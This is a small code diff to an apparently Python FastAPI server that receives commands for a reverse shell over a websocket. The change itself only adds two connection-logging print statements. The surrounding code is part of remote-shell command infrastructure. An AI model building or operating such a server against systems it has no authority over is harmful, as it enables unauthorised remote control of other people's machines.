@@ -115,7 +115,9 @@ async def download_file(filename: str):
 # open a websocket connection to the reverse shell
 @app.websocket("/ws/{client_id}")
 async def websocket_endpoint(websocket: WebSocket, client_id: int):
+    print("waiting for connection")
     await manager.connect(websocket)
+    print(f"Client {client_id} connected")
     try:
         while True:
             command = await manager.receive_shell_command(websocket)
